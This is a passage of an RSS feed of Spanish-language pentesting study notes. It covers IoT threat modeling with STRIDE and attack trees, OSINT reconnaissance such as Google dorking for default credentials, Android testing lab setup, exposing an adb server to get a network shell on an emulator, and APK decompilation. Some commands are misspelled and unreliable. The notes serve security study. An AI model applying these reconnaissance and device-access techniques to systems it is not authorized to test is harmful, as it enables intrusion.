Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/enviroment/personalización-de-entorno-de-hacking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Enviroment/Personalización de Entorno de Hacking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Aug 2024 15:33:15 GMT</pubDate></item><item><title><![CDATA[1. Threat Modeling]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:pentesting" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#pentesting</a> <a class="tag" href="https://dobliuw.com/?query=tag:IoT" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#IoT</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:pentesting" class="tag" target="_blank" rel="noopener nofollow">#pentesting</a> <a href="https://dobliuw.com?query=tag:IoT" class="tag" target="_blank" rel="noopener nofollow">#IoT</a>  
<br><br>Apuntes realizados a partir del libro "Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things"<br><br>El Internet de las cosas o Internet of Things describe objetos físicos con sensores, capacidad de procesamiento, software, etc que se conectan e intercambian datos con otros dispositivos y sistemas a través de internet u otras redes de comunicación.<br>Debido a que la seguridad de IoT se diferencia de la seguridad de TI tradiciional, los sistemas IoT también requieren diferentes técnicas. El ecosistema IoT suele estar compuesto por dispositivos y sensores integrados, dispositivos móviles, aplicaciones, infraestructura en la nube y protocolos de comunicación de red. Estos protocolos puede incluir aquellos en el stack de red TCP/IP como por ejemplo, mDNS, DNS-SD, UPnP, WS-Discovery, DICOM, también protocolos usados en rangos medios como Wi-Fi, Wi-Fi Direct, Zigbee, y de rango lejano como LoRa, LoRaWAN y Sigfox.<br><br><br>Una de las formas más sencillas de comenzar a modelar la amenaza (Threat Modeling) respecto a la cibereseguridad, es seguir un framework como el modelo de clasificación de amenazas STRIDE, que se centra en identificar debilidades en la tencología en lugar de activos vulnerables o posibles atacantes.<br>El acrónimo representa las siguientes amenazas:<br>
<br>S*poofing***:  Cuando un atacante pretende desempeñar el papel de un componente del sistema.
<br>T*ampering***: Cuando un atacante viola la integridad de los datos o de un sistema.
<br>R*epudiation***: Cuando los usuarios pueden negar que realizaron ciertas acciones en el sistema.
<br>I*nformation Disclosure***: Cuando un atacante viola la confidencialidad de los datos del sistema.
<br>D*enial of Service***: Cuando un atacante puede interrumpir la disponibilidad de un sistema.
<br>E*elevation of Privilege***: Cuando los usuarios o componentes del sistema puede elevar a un nivel de privilegio al que no deberían tener acceso.
<br>STRIDE tiene tres pasos: 1. Identificar la arquitectura, 2. dividirla en componentes y 3. identificar amenazas en cada componente. <br><br>Para identificar nuevas amenazas de una manera diferente o mismo para modelar las ya identificadas con el framework STRIDE para un análisis más detallado, se puede hacer uso de los denominados árbol de ataques o Attack Trees. Un árbol de ataque es un mapa visual que comienza definiendo un objetivo de ataque genérico y luego se vuelve más específico a medida qeu el árbol se expande. Por ejemplo, en la imagen de abajo se muestra un árbol basado por amenazas de manipulación de la entrega de medicamentos (Usando el ejemplo del libro tratandose de un pump service - Pág. 19).<br>
Los árboles de ataque pueden proporcionar una mayor comprensión del resultado de nuestro threat modeling, y podríamos descubrir amenazas que pasamos por alto antes. Observando la imagen, podemos ver que cada nodo contiene un posible ataque que requiere uno o más de los ataques descritos en los nodos secundarios. En algunos casos, el ataque puede requerir todos los nodos secundarios. Por ejemplo, la manipulación de los datos de la base de datos dentro de las bombas de infusión requiere que se obtenga acceso a la base de datos y la tenencia de controles de acceso inadecuados en las tablasd e la bibluioteca de medicamentos. Sin embargo, la entrega puede ser alterada cambiando la velocidad de infusión o interrumpiendo la actualización de la velocidad de infusión mediante un ataque DoS.<br><img alt="IoT_Attack_tree.png" src="https://dobliuw.com/lib/media/iot_attack_tree.png"><br><br><br><br>En un ataque de interferencia de señal o Signal Jamming, el atacante interfiere con la comunicación entre dos sistemas. Los sistemas de IoT suelen tener sus propios ecosistemas de nodos. Por ejemplo, el sistema de bomba de infusión de medicamentos tiene un servidor de control conectado a múltiples bombas de infusión de medicamentos. Con equipo especial, es posible aislar el servidor de control y las bombas entre sí. En sistmeas criticos como este, esta amenaza podría resultar fatal.<br><br>En un atauqe de repetición o Replay, el atacante repite alguna operación o reenvía un paquete transmitido. En el ejemplo de la bombna de infusión de medicamentos, esto podría significar que un paciente recibe múltiples dosis de un medicamento. repetir ataques, independientemente de que afecten o no a los dispositivos IoT, suelen ser graves.<br><br>En los ataques de manipulación de entorno o settings tampering, el atacante aprovecha la falta de seguridad de un componente para cambiar su configuracion. Para el ejemplo de la bomba de infusión de medicamentos, estas configuraciones podría incluir que se intercambie el servidor de control con un servidor de control malicioso controlado por el atacante, cambiar el fármaco principal utilizado o alterar la configuracion de la red para provocar un DoS.<br><br>Los ataques a la integridad del hardware o hardware integrity comprometen la integridad de ldispositviod físico. Por ejemplo, un atacante podría eludir bloqueso inseguros o puertos USB de fácil acceso, especialmente si son de arranque. todos los sitemas de IoT enfrentan esta amenaza, porque ninguna portección de la integridad del dispositivo es perfecta. Aún así, ciertas técnicas lo hacen más dicícil.<br><br>La clonacio´n de nodos es una maenaza que surge como parte de un ataque Sybil, en el que un atacante crea nodos falsos en una red para comprometer su confiabilidad. Los sistemas de IoT suele utilizar varios nodos en su ecosistema, como cuando un servidor de control gestiona varias bombas de infusión de medicamentos. A menudo encotramos amenzas de clonación de nodos en los sistemas de IoT. Una razón es qeu los protocolos de sasociación que utilizan los nodos para comunicarse no so muy sofisticados y, en ocasiones, crear nodos falsos puede resultar fácil. Ocasionalmente, incluso puedes crear un nodo maestro falso (Siguiendo el ejemplo de las bombas de infusión, el servidor de control). Esta amenaza podría afectar al sistema de vcarias maneras: ¿ Exisrte un número finitio de dnodos a lso que sepuede conectar un servidor de ctronol?, ¿ Puede esta amenaza dar lugar a un ataque de denación de serivico ?, ¿ üede hacer que los atcantes porpaguen información falsificada?. <br><br>Las violaciones de la privacidad son una de las amenazas más grandes y consistentes en los sistemas IoT. A menudo, muy poco protege la confidencialidad de los datos del usuario, por lo que puede encontrar esta amenaza en casi cualquier protocolo de comunicación que transfiera datos hacia y desdfe un dispositivo.<br><br>Incluso si logra mitigar todas las demás amenazas, probablemente tendrá problemas para abordar la conciencia de seguridad de los usuarios. Esto podría incluir su capacidad para detectar correos electrónicos de phsihing, que podrían comprometer sus workstations, o su hábito de permitir el acceso a personas no autorizadas a áreas sensibles.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/iot/1.-threat-modeling.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/IoT/1. Threat Modeling.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Feb 2024 15:24:50 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/iot_attack_tree.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/iot_attack_tree.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2. Security Testing Methodology]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:pentesting" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#pentesting</a> <a class="tag" href="https://dobliuw.com/?query=tag:IoT" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#IoT</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:pentesting" class="tag" target="_blank" rel="noopener nofollow">#pentesting</a> <a href="https://dobliuw.com?query=tag:IoT" class="tag" target="_blank" rel="noopener nofollow">#IoT</a>  
<br><br>Apuntes realizados a partir del libro "Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things" Part 1 (3)<br><br>Cuando queremos realizar un pentesting a dispositivos IoT puede ser que nos encontremos con una superficie de ataque pequeña, lo cual vuelva más simple esta tarea, pero tanto en casos simples como más complejos, el no seguir una fuerte metodología para esta tarea puede derivar en perdidas de puntos criticos en esta tarea.<br><img alt="IoT-Methodology_pentesting.png" src="https://dobliuw.com/lib/media/iot-methodology_pentesting.png"><br><br><br>El reconocimiento pasivo, también referido como open source intelligence (OSINT / <a data-href="Reconocimiento Pasivo" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-pasivo.html" class="internal-link" target="_self" rel="noopener nofollow">Reconocimiento Pasivo</a>) también es aplicado en este caso para el pentesting de dispostivios IoT, algunos de los puntos más importantes a destacar de esta fase son:<br><br>Los manuales del sistema puede proveer información muy importante sobre el interno funcionamiento de los dispositivos. Usualmente podemos encontrar estos documentos en la página web oficial del fabricante. En caso de no contar con una, podríamos hacer uso de <a data-href="Google Dorking" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/google-dorking.html" class="internal-link" target="_self" rel="noopener nofollow">Google Dorking</a> para buscar el dispositivo seguiro de un inurl:pdf para conseguir posibles documentos sensibles que puedan llegar a hablar de contraseñas y usuarios por defecto, especificaciones definidas sobre el sistema y sus componentes, diagramas de red y arquitectura, y hasta un apartado de solución de problemas recurrentes en los dispositivos que podrían brinarnos un buen abanico de posibilidades a probar.<br><br>Otro recurso importante, para dispositivos que usan radio comunicación, es la <a data-tooltip-position="top" aria-label="https://fccid.io/" rel="noopener nofollow" class="external-link" href="https://fccid.io/" target="_blank">FCC ID Online DataBase</a>. Un FCC ID es un identificador único asignado al dispositivo registrado con la United States Federal communications Commission. Todos los dispositivos emisores inalámbros vendidos en Estados Unidos debe terner una identificación de la FCC. Buscando el FCC ID de un dispositivo, se puede encontrar detalles sobre la frecuencia operativa inalámbrica (Como su fuerza), fotografías internas del dispositivo, manuales de usuario y más. La FCC ID generalmente está grabada en la caja del componente o dispositivo electrónico.<br><img alt="IoT_FCCID_Example.png" src="https://dobliuw.com/lib/media/iot_fccid_example.png"><br><br> Las patentes puede proveer información sobre el interno funcionamiento de ciertos dispositivos. Dichos dispositivos y sus respectivas patentes podrían ser búscadas en <a data-tooltip-position="top" aria-label="https://patents.google.com/" rel="noopener nofollow" class="external-link" href="https://patents.google.com/" target="_blank">google patents</a>. Las patentes casi siempre van a tener contenido el diagrama de flujo que puede ayudarnos cuando accedemos a los canales de comunicación entre el dispositivo y otro sistema.<br><br>Es muy importante tener en cuenta cuanto información pública se puede encontrar en medios de comunicación social (Redes sociales), foros online y chat rooms. Incluso se puede hacer uso de Amazon y páginas como eBay para leer reseñas, descripciones como fuentes de conocimiento. Buscar por quejas de los usuarios sobre ciertas funcionalidades del dispositivo. También, se pueden revisar perfiles o posteos de LinkedIn y Twitter/x, donde ingenieros y/o personal IT puede realizar sus reviews brindando informacion técnica que nos puede ser de valor.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/iot/2.-security-testing-methodology.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/IoT/2. Security Testing Methodology.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Feb 2024 18:24:30 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/iot-methodology_pentesting.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/iot-methodology_pentesting.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Android Lab]]></title><description><![CDATA[ 
 <br><br>Deberemos llevar a cabo la instalación de algunas herramientas para conseguir tener un laboratorio personale el cual nos permite llevar a cabo análizis estáticos y dinámicos en softwares móviles para Android.<br><br><br><br>Lo primero que deberemos hacer es instalar <a data-tooltip-position="top" aria-label="https://www.java.com/en/" rel="noopener nofollow" class="external-link" href="https://www.java.com/en/" target="_blank">Java</a>.<br><br>Automatización: Para sistemas Kali Linux podríamos hacer uso de la herramienta <a data-tooltip-position="top" aria-label="https://github.com/Dewalt-arch/pimpmykali" rel="noopener nofollow" class="external-link" href="https://github.com/Dewalt-arch/pimpmykali" target="_blank">pimpmykali</a>, desarrollada por un usuario de la plataforma TCM Security, la cual nos permitiría hacer uso de un scritp el cual automatize la instalación de todas las herramientas necesarias. (En caso de hacer uso de este script ignorar la instalación manual de cada herramienta encontrada abajo).<br>En caso de no contar con Java en Windows, podríamos seguir la <a data-tooltip-position="top" aria-label="https://www.java.com/en/download/help/linux_x64_install.html" rel="noopener nofollow" class="external-link" href="https://www.java.com/en/download/help/linux_x64_install.html" target="_blank">guía de instalación</a> para descargar e instalar Java.<br># Updatae
sudo apt-get update
# Install Java Development Kit
sudo apt-get install default-jdk -y
Copy<br><br><br><a data-tooltip-position="top" aria-label="https://github.com/skylot/jadx" rel="noopener nofollow" class="external-link" href="https://github.com/skylot/jadx" target="_blank">JADX</a> es una herramienta de código abierto que nos permite decompilar el código de Android Dex y archivos APK. Esta herramienta cuenta con utilidades de línea de comandos y GUI.<br><br>Para llevar a cabo la descarga de la misma deberemos visitar la <a data-tooltip-position="top" aria-label="https://github.com/skylot/jadx/releases/tag/v1.5.0" rel="noopener nofollow" class="external-link" href="https://github.com/skylot/jadx/releases/tag/v1.5.0" target="_blank">página de los releases</a> y descargar el instalador .exe correspondiente a nuestra arquitectura.<br><br>Para descargar jadx en linux podríamos hacer uso de los comandos:<br># Update
sudo apt-get update
# Install jdx
sudo apt-get install jadx
Copy<br>Podríamos hacer uso de jadx para hacer uso de CLI o jadx-gui para hacer uso de la GUI.<br><br><br>Las SDK Platoform-Tools son un conjunto de utilidades esenciales incluidas en el SDK (Software Development Kit) de Android, que permiten a los desarrolladores interactuar con el dispostivio Android durante el desarrollo, prueba y despliegue de aplicaciones. Entre las herramientas más imporatantes en este conjunto se encuentra adb (Android Debug Bridge) y fastboot. <br>adb es una herramienta versátil que permite a los desarrolladores comunicarse con un dispositivo Android desde su equipo. Las funcionalidades principales de esta son:<br>
<br>Connection and Communication: Permite conectar y comunicarse con un dispostivo Android conectado por USB o mediante una conexión de red.
<br>Installing the application: Permite instalar (adb install) y desisntalar (adb uninstall) aplicaciones en el dispositivo.
<br>Debuggin and Logcat: Permite depurar aplicaciones en tiempo real y obtener registros de eventos del sistema (adb logcat).
<br>File system Access: Permote copiar archivos entre el dispostivio y el equipo (adb push y adb pull).
<br>Command Execution: Permite ejecutar comandos de shell en el dispositivo (adb shell), proporcionando acceso directo al sistema operativo Android.
<br>Device Restart: Permite reiniciar el dispositivo en diferentes modos, como recovery o bootloader (adb reboot).
<br># List all connected devices
adb devices
# Install an app in the device
adb install {myapp.apk}
# Show events logs from the system
adb logcat
# Display a Shell in the device
adb shell
Copy<br>fastboot por otro lado, es una herramienta que permite interactuar con el bootloader del dispositivo Android. Es particularmente útil para tareas de recuperación y actualización del firmware del dispositivo. Las funcionalidades principales de fastboot incluyen:<br>
<br>Image Flashing: Permite flashear distintas particiones del dispositivo (boot, recovery, system) con imágenes de firmware.
<br>Bootloader Unblocking: Permite desbloquear y bloquear el bootloader del dispositivo, lo cual es necesario para flashear imágenes personalizadas.
<br>Reboot in specific modes: Permite reiniciar el dispositivo en modo bootloader o en modo de recuperación.
<br># Dispay the devices with fastboot mode
fastboot device
# Unblock bootloader
fastbook oem unblock
# Flashing a new recovery image
fastboot flash recovery {recovery.img}
# Reboot the device
fastboot reboot
Copy<br><br>Nos dirigimos a la página web de <a data-tooltip-position="top" aria-label="https://developer.android.com/tools/releases/platform-tools" rel="noopener nofollow" class="external-link" href="https://developer.android.com/tools/releases/platform-tools" target="_blank">developer.android</a> y seleccionamos la opción de Download SDK Platform-Tools for Windows. Esto nos descargará un zip el cual una vez extraido nos dejará una carpeta con las herramientas deseadas, para poder correr estas desde la terminal será necesario agregar esta carpeta dentro de una carpeta perteneciente a la variable de entorno PATH. <br>Para modificar la variable de entorno PATH para ingresar esta carpeta una vez movida a una nueva ruta deseada podríamos hacer uso de la GUI ingresando Edit environment variables for your account y Editando la variable de entorno PATH, agregando una nueva ruta hacia la carpeta descargada una vez movida a la ruta que deseemos, o desde la CLI con los siguientes comandos:<br>cmd.exe<br># Syntaxis
setx {var_name} "{value}"
# Adding a new route at the end of the var PATH
setx PATH "%PATH%;C:\New\Route"
# Adding a new route at the beginning of the var PATH
setx PATH "C:\New\Route;%PATH%"
Copy<br>powershell.exe<br>&gt; $env:Path += ";C\New\Route"
&gt; [Environment]::SetEnvironmentVariable("Path", $env:Path, [EnvironmentVariableTarget]::Machine)
Copy<br>Es importante tener en cuenta que se necesitará cerrar la ventanas y volverlas a abrir para aplicar los cambios de las variables de entornos, pero podríamos hacer uso de scripts como <a data-tooltip-position="top" aria-label="https://pastebin.com/1fJqA0pT" rel="noopener nofollow" class="external-link" href="https://pastebin.com/1fJqA0pT" target="_blank">refreshenv</a> para guardarlos en el sistema y poder tener una utilidad para refrescar las variables de entorno y que esto no sea necesario. <br><br>Para descargar adb en Kali Linux es bastante sencillo, lo único que deberíamos hacer es ejecutar el comando:<br># Update
sudo apt-get update
# Install adb
sudo apt-get install adb 
Copy<br><br><br>Apktool es una herramienta de ingeniería inversa para archivos APK. <a data-tooltip-position="top" aria-label="https://github.com/iBotPeaches/Apktool?tab=readme-ov-file" rel="noopener nofollow" class="external-link" href="https://github.com/iBotPeaches/Apktool?tab=readme-ov-file" target="_blank">Repositorio oficial</a> y <a data-tooltip-position="top" aria-label="https://apktool.org/docs/install" rel="noopener nofollow" class="external-link" href="https://apktool.org/docs/install" target="_blank">Guía de installación</a><br><br>Nos dirigimos al sitio oficial de descarga de <a data-tooltip-position="top" aria-label="https://apktool.org/" rel="noopener nofollow" class="external-link" href="https://apktool.org/" target="_blank">apktool</a> y presionamos el boton de Download x.x.x. <br><br>Para descargar apktool en Kali Linux, simplemente deberiamos ejecutar los comandos:<br># Update
sudo apt-get update
# Install apktool
sudo apt-get install apktool
Copy<br>En caso de correr el comando apktool y ver la versión 2.6.1-dirty podríamos actualizar apktool a la última versión usando este <a data-tooltip-position="top" aria-label="%5Bhttps://ibotpeaches.github.io/Apktool/%5D(https://ibotpeaches.github.io/Apktool)" rel="noopener nofollow" class="external-link" href="https://dobliuw.com/[https://ibotpeaches.github.io/Apktool/](https://ibotpeaches.github.io/Apktool)" target="_blank">link</a>.<br><br><br>Android Studio es el entorno de de sarrollo integrado (IDE) oficial para el desarrollo de aplicaciones Android, este proporciona un conjunto completo de herramientas para el desarrollo, depuración, prueba y despliegue de aplicaciones Android.<br><br>Nos dirigimos a la <a data-tooltip-position="top" aria-label="https://developer.android.com/studio" rel="noopener nofollow" class="external-link" href="https://developer.android.com/studio" target="_blank">página oficial de descarga</a> y seguimos el proceso instalación de cualquier software que descarguemos.<br><br>Importante: En caso de estar haciendo uso de una VM evitar la instalación, dado que si intentamos instalar esto e intentamos emular podremos tener porblemas y crasheos en la aplicación de virtualización. Seguir el procedimiento de descarga si estamos haciendo uso de una máquina linux.<br>En este caso nos dirigimos a la <a data-tooltip-position="top" aria-label="https://developer.android.com/studio" rel="noopener nofollow" class="external-link" href="https://developer.android.com/studio" target="_blank">página oficial de descarga</a>, descargamos el archivo tar.gz, lo descomprimimos con tar -xgzf {android_studio_download.tar.gz}, esto nos dejará una carpeta que contrendrá un subdirectorio llamada bin con un archivo studio.sh el cual podremós ejecutar.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-lab-setup/android-lab.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Android/0. Lab Setup/Android Lab.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 20 May 2024 18:12:57 GMT</pubDate></item><item><title><![CDATA[Laboratorie]]></title><description><![CDATA[ 
 <br><br>Una vez configurado nuestro setup con todas las dependencias instaladas (<a data-href="Android Lab" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-lab-setup/android-lab.html" class="internal-link" target="_self" rel="noopener nofollow">Android Lab</a>) podríamos comenzar a usar el mismo para diversas funcionalidades y actividades, en nuestro caso, para el pentesting estaremos centrandonos en los módulos Logcat, Terminal, Emulator y Device File Explore. Podríamos conectar mediante USB a nuestro equipo un dispositivo Android o emularlo:<br>Seleccionando este apartado de aca:<br>
<img alt="emulator_android_lab.png" src="https://dobliuw.com/lib/media/emulator_android_lab.png" style="width: 600px; max-width: 100%;"><br>Podríamos emular diversa cantidad de celulares, tablets, televisiones y lo que deseemos, teniendo en cuenta que esta app esta originalmente pensada con fines de desarrollo de aplicaciones, las posibilidades son muchisimas.<br>Aquellos modelos de dispositivos que tengan el logo de la Play Store son aquellos que nos permitirán interactuar con la Play Store dado que esté tendrá acceso a los serivicios de Google Play. Esto significa que podremos instalar aplicaciones directamente desde la Play Store en nuestro emulador, lo caul es útil para probar aplicaciones que dependen de los servicios de Google Play.<br><img alt="android_studio_emulation.png" src="https://dobliuw.com/lib/media/android_studio_emulation.png"><br>Una vez seleccionado nuestro dispositivo (Se recomienda Nexus 5), nos encontraremos con la sección para seleccionar nuestra imagen, estas son imagenes del sistema operativo Android que deseamos ejecutar para nuestro emulador, esta incluye versión de Android así como la arquitectura de CPU que utilizará.<br>Es importante tener en cuenta que el API Level es un nivel de API asociado a la versión de Android, cada versión tiene un número de nivel de API único, por ejemplo, Android 10 corresponde al nivel de API 29. Este nivel de API es importante porque define las capacidades y características del sistema operativo que nuestra aplicación podrá utilizar. Por otro lado el ABI (Application Binary Interfcae) indicá la arquitectura de la CPU que la imagen soporta.<br><img alt="system_image_android_studio.png" src="https://dobliuw.com/lib/media/system_image_android_studio.png"><br>Por último simplemente seleccionaremos un nombre y alguna configuración a gusto adicional y tendremos la capacidad de emular nuestro android con un simple boton, el cual nos desplegará una pantalla con un celular el cual podrémos manejar con normalidad.<br><br><br>Algo que podemos realizar con ADB, es exponer un socket (<a data-href="Sockets" href="https://dobliuw.com/notes/2.-networks/basic/redes/sockets.html" class="internal-link" target="_self" rel="noopener nofollow">Sockets</a>) para conectarnos a través de una VM o un equipo en la red para poder ejecutar comandos, o por ejemplo, conectarnos para obtener una shell el el dispositivo que esta siendo emulado.<br>Los comandos a ejecutar en el equipo que abrirá el socket para recibir conexiones seran:<br># Kill all processes associated to adb.exe
taskkill /f /t /im adb.exe
# Open a socket on 0.0.0.0:5037
adb -a nodaemon server
Copy<br>Mientras que desde el equipo en la red o la VM desde donde nos querremos conectar (Deberá tener instalado adb) sera:<br># Spawn a shell into de emulated device using socket opened 
adb -H {host_ip} -P 5037 shell
Copy<br><br><br>Las developer options u opciones de desarrollador en Android son un conjunto de configuraciones avanzadas que los desarrolladores pueden habilitar para probar y depurar aplicaciones y otros comportamientos del sistema operativo Android. Estas opciones proporcionan herramientas y configuracinoes que no están disponibles para el usuario promedio, facilitando tareas como el monitoreo de rendimiento, la depuración, la captura de errores y la simulación de condiciones específicas.<br><br>Para habilitar las opciones de desarrollador en un dispositivo Android lo que deberemos hacer es:<br>
<br>Abrir la aplicación de Configuración.
<br>Desplazarnos hacia abajo y seleccionar Acerca del teléfono.
<br>Encontrar el número de compilación (Puede estar en Información del software).
<br>Tocar este número siete veces (Una vez hecho veremos el mensaje indicando que ahora somos desarrolladores).
<br>Regresar al menú principal de configuración y veremos una nueva opción llamada Opciones de desarrollador o Developer Options. 
<br>Una vez hecho esto, las principales opciones de desarrollador que pueden interesarnos tanto como desarrolladores como pentesters son:<br>USB Depuration<br>
Nos permite que nuestro dispositivo Android se comunique con una computadora a través de una conexión USB para la depuración de aplicaciones, esta opción es escencial para usar Android Debug Bridge (ADB) para instalar APKs, depurar aplicaciones y acceder a otros comandos de desarrollo.<br>Logcat (Registro de depuración)<br>
Captura y muestra mensajes de registro generados por el sistema y aplicaciones. Es útil para idetnficar erroers y obtener información de estado de las aplicaciones.<br>Fictitious location<br>
Permite simular ubicaciones GPS para probar aplicaicones que utilizan servicios de ubicación sin moverse físicamente y en cuanto al pentesting nos podría servir para evitar bloqueos por geolocalización.<br>GPU profile<br>
Muestra gráficos de tiempo de cuadro para ayudar aidentificar problemas de rendimiento gráfico. Esto podría servirnos para lograr identificar posibles vulnerabilidades de <a data-href="Race Conditions" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/race-conditions.html" class="internal-link" target="_self" rel="noopener nofollow">Race Conditions</a>.<br>Stay awake<br>
Evitar que la pantalla se apague mientras este conectado a un USB para.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-lab-setup/android-lab-configs-and-tips.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Android/0. Lab Setup/Android Lab configs and tips.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:33:32 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/emulator_android_lab.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/emulator_android_lab.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Static Analysis]]></title><description><![CDATA[ 
 <br><br>Como vimos en el apartado de <a data-href="Mobile Application Penetration Testing Process" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/mobile-application-penetration-testing-process.html" class="internal-link" target="_self" rel="noopener nofollow">Mobile Application Penetration Testing Process</a>, el análizis estático consiste en analizar la aplicación sin ejecutar la misma, únicamente análisis de código para poder detectar fallas o vulnerabilidades potenciales.<br><br><br>Para descargar aplicaciones desde Google Play Store y obtener el apk directamente desde está fuente, podríamos hacer uso del comando adb shell en nuestra <a data-href="Android Lab" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-lab-setup/android-lab.html" class="internal-link" target="_self" rel="noopener nofollow">Android Lab</a> para obtener acceso a un dispositivo emulado, una vez en la terminal que nos permite manejar desde CLI este dispositivo, podríamos tener en mente los sigueintes comandos tras la instalación de nuestra aplicación, por ejemplo podría ser Android Injured.<br>adb shell
pm list packages
pm path {package_name}

adb pull {path} {name_to_save_apk}
Copy<br><br><br>En caso de necesitar subir un APK de una aplicación que no esta en la Play Store a nuestro emulador, podríamos hacerlo utilizando adb sin necesidad de tener acceso a adb root.<br>Desde una cmd.exe podríamos validar los dispositivos que estan siendo emulados con el comando:<br>adb devices
Copy<br>En caso de tener más de un dispositivo emulado, con el parametro -s podríamos especificar el dispositivo que queremos utilizar, en caso de únicamente tener uno, esto no será necesario.<br># Push file.apk to /data/local/tmp on emulator-5554
adb -s emulator-5554 push C:\Path\To\Our\File.apk /data/local/tmp
# Push file.apk to /data/local/tmp on our device
adb push C:\Path\To\Our\File.apk /data/local/tmp
Copy<br>Una vez subido el archivo APK a la ruta /data/local/tmp, simplemente faltaría instalar este.<br># Install the File.apk
adb shell pm install /data/local/tmp/File.apk
Copy<br><br>En caso de obtener un error similar a este, esto indica que el APK que estamos intentando instalar contiene bibliotecas nativas que no son compatibles con la arquitectura del emulador Android en el que estamos tratando de instalar la misma.<br>Para verificar la Arquitectura del Emulador podríamos ejecutar el comando:<br>adb shell getprop ro.product.cpu.abi
Copy<br>Este comando, nos dirá cuál es la arquietcuta del CPU del emulador (Podría ser x86, armeabi-v7a, arm64-v8a, etc.).<br>De igual manera, para verificar la Arquitectura del APK podríamos utilizar herramientas como aapt (Que vieene con Android SDK) la cual nos permitirá verificar las arquitecturas soportadas por el APK.<br>aapt dump badging C:\Path\To\Our\File.apk
Copy<br>La solución a esto, en caso de que realmente no sean compatibles por las arquitecturas es, o descargar una versión compatible del APK, o emular un dispositivo con una arquitectura soportada por el APK.<br><br><br>Haciendo uso de la herramienta Jadx instalada, podríamos hacer uso de la GUI (jadx-gui) para visualizar la estructura de directorios de un apk, o con el comando jadx {C:\path\to\file.apk} intentar descompilar el apk y tener una estructura de directorios con todo lo que contenía el apk.<br>Visualización de jadx-gui tras la ejecución del comando jadx-gui {C:\path\to\file.apk}: <br><img alt="jadx_gui_example.png" src="https://dobliuw.com/lib/media/jadx_gui_example.png"><br>También podríamos hacer uso de la herramienta Apktool la cual intenta realizar esta misma tarea de descompilar el .apk con el comando apktool d {C:\path\to\file.apk}<br># Try decompile apk using jadx
jadx C:\Users\dobliuw\AndroidStudio\project\base.apk
# Try decompile apk using apktool
apktool d C:\Users\dobliuw\AndroidStudio\project\base.apk
Copy<br>Si bien ambas herramientas se uitilizan para lo mismo, hay algunas diferencias que podemos tener en cuenta a la hora de elegir cual usar y en que contexto hacerlo:<br>jadx<br>
<br>La principal característica de jadx es que descompila directamente los archivos DEX en código Java legible. Esto facilita la lectura y comprensión del código fuente de una aplicación.
<br>A su vez, proporciona una interfaz gráfica (jadx-gui) que permite explorar el c´dogio fuente de la aplicación de manera más intuitiva.
<br>Es ideal para quellos que buscan analizar la lógica del código fuente de una aplicación Android y comprender cómo funciona a nivel de Java. Es más útil cuando el objetivo es entedner el comportamiento de la aplicación o buscar vulnerabilidades de seguridad a nivel más alto.
<br>apktool<br>
<br>Cuando descompilamos un APK con apktool, obtenemos archivos Smali, que son más bajos en nivel que Java y representan instrucciones de bytecode.
<br>A su vez, nos permite modificar lso recursos de la aplicación (Como XML, imágenes, etc.) y volver a empaquetar (Recompilar) el APK con los cambios realizados.
